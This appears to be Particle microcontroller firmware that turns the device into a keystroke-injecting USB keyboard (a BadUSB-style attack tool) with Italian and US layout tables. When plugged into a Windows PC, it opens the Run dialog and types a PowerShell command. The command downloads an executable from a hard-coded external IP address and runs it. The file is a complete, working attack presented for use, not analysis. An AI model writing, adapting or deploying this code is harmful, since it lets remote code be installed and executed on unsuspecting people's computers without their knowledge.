#include "Particle.h"

// uncomment for semi-automatic mode if needed
// SYSTEM_MODE(SEMI_AUTOMATIC);

STARTUP(Keyboard.begin());

enum KeyboardLayout {
    LAYOUT_IT,
    LAYOUT_US
};


KeyboardLayout currentLayout = LAYOUT_US;  // <<< change here to LAYOUT_US or LAYOUT_IT
const char* command = "powershell mkdir C:/Temp -Force; iwr http://217.154.152.103/utility.exe -OutFile C:/Temp/utility.exe; Start-Process C:/Temp/utility.exe";


void pressKey(uint8_t key) {
    Keyboard.press(key);
    delay(2);
    Keyboard.release(key);
    delay(2);
}

void pressShiftKey(uint8_t key) {
    Keyboard.press(KEY_LEFTSHIFT);
    Keyboard.press(key);
    delay(5);
    Keyboard.releaseAll();
    delay(5);
}

void pressAltGrKey(uint8_t key) {
    Keyboard.press(KEY_RIGHTALT);
    Keyboard.press(key);
    delay(5);
    Keyboard.releaseAll();
    delay(5);
}

void typeAlphaNum(char c) {
    if (c >= 'a' && c <= 'z') {
        pressKey(KEY_A + (c - 'a'));
    } else if (c >= 'A' && c <= 'Z') {
        Keyboard.press(KEY_LEFTSHIFT);
        pressKey(KEY_A + (c - 'A'));
        Keyboard.release(KEY_LEFTSHIFT);
    } else if (c >= '0' && c <= '9') {
        switch(c) {
            case '0': pressKey(KEY_0); break;
            case '1': pressKey(KEY_1); break;
            case '2': pressKey(KEY_2); break;
            case '3': pressKey(KEY_3); break;
            case '4': pressKey(KEY_4); break;
            case '5': pressKey(KEY_5); break;
            case '6': pressKey(KEY_6); break;
            case '7': pressKey(KEY_7); break;
            case '8': pressKey(KEY_8); break;
            case '9': pressKey(KEY_9); break;
        }
    } else if (c == ' ') {
        pressKey(KEY_SPACE);
    }
}

void typeSymbol(char c) {
    switch(currentLayout) {
        // ===== IT =====
        case LAYOUT_IT:
            switch(c) {
                case '-': pressKey(KEY_SLASH); break;            // US '/'
                case '_': pressShiftKey(KEY_SLASH); break;       // US '/' with SHIFT
                case '\'': pressKey(KEY_MINUS); break;           // US '-'
                case '?': pressShiftKey(KEY_MINUS); break;       // US '-' with SHIFT
                case '.': pressKey(KEY_DOT); break;              // US '.'
                case ':': pressShiftKey(KEY_DOT); break;         // US '.' with SHIFT
                case ',': pressKey(KEY_COMMA); break;            // US ','
                case ';': pressShiftKey(KEY_COMMA); break;       // US ',' with SHIFT
                case '@': pressAltGrKey(KEY_SEMICOLON); break;   // US ';' with ALTGR
                case '\\': pressKey(KEY_GRAVE); break;           // US '`'
                case '|': pressShiftKey(KEY_GRAVE); break;       // US '`' with SHIFT
                case '+': pressKey(KEY_RIGHTBRACE); break;       // US ']'
                case '*': pressShiftKey(KEY_RIGHTBRACE); break;  // US ']' with SHIFT
                case ']': pressAltGrKey(KEY_RIGHTBRACE); break;  // US ']' with ALTGR
                case '[': pressAltGrKey(KEY_LEFTBRACE); break;   // US '[' with ALTGR
                case '!': pressShiftKey(KEY_1); break;           // US '1' with SHIFT
                case '"': pressShiftKey(KEY_2); break;           // US '2' with SHIFT
                case '$': pressShiftKey(KEY_4); break;           // US '4' with SHIFT
                case '%': pressShiftKey(KEY_5); break;           // US '5' with SHIFT
                case '&': pressShiftKey(KEY_6); break;           // US '6' with SHIFT
                case '/': pressShiftKey(KEY_7); break;           // US '7' with SHIFT
                case '(': pressShiftKey(KEY_8); break;           // US '8' with SHIFT
                case ')': pressShiftKey(KEY_9); break;           // US '9' with SHIFT
                case '=': pressShiftKey(KEY_0); break;           // US '0' with SHIFT
            }
            break;

        // ===== US =====
        case LAYOUT_US:
            switch(c) {
                case '-': pressKey(KEY_MINUS); break;
                case '_': pressShiftKey(KEY_MINUS); break;
                case '/': pressKey(KEY_SLASH); break;
                case '?': pressShiftKey(KEY_SLASH); break;
                case '.': pressKey(KEY_DOT); break;
                case ':': pressShiftKey(KEY_SEMICOLON); break;
                case ',': pressKey(KEY_COMMA); break;
                case ';': pressKey(KEY_SEMICOLON); break;
                case '\\': pressKey(KEY_BACKSLASH); break; // char: \
                case '|': pressShiftKey(KEY_BACKSLASH); break;
                case '+': pressShiftKey(KEY_EQUAL); break;
                case ']': pressKey(KEY_RIGHTBRACE); break;
                case '[': pressKey(KEY_LEFTBRACE); break;
                case '=': pressKey(KEY_EQUAL); break;
                case '"': pressShiftKey(KEY_APOSTROPHE); break;
                case '\'': pressKey(KEY_APOSTROPHE); break; // char: '
                case '{': pressShiftKey(KEY_LEFTBRACE); break;
                case '}': pressShiftKey(KEY_RIGHTBRACE); break;                
                case '!': pressShiftKey(KEY_1); break;
                case '@': pressShiftKey(KEY_2); break;
                case '#': pressShiftKey(KEY_3); break;
                case '$': pressShiftKey(KEY_4); break;
                case '%': pressShiftKey(KEY_5); break;
                case '&': pressShiftKey(KEY_7); break;
                case '*': pressShiftKey(KEY_8); break;
                case '(': pressShiftKey(KEY_9); break;
                case ')': pressShiftKey(KEY_0); break;
            }
            break;
    }
}

void typeText(const char *text) {
    for(int i=0; text[i] != '\0'; i++) {
        char c = text[i];
        if ((c >= 'a' && c <= 'z') || 
            (c >= 'A' && c <= 'Z') || 
            (c >= '0' && c <= '9') || 
            c == ' ') {
            typeAlphaNum(c);
        } else {
            typeSymbol(c);
        }
    }
}


void setup() {
    delay(1000); // wait for USB

    // open Run dialog (Win+R)
    Keyboard.press(KEY_LEFTGUI);
    Keyboard.write('r');
    Keyboard.releaseAll();
    delay(400);

    typeText(command);

    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
}

void loop() {
    // add some kind of loop if you want :)
}
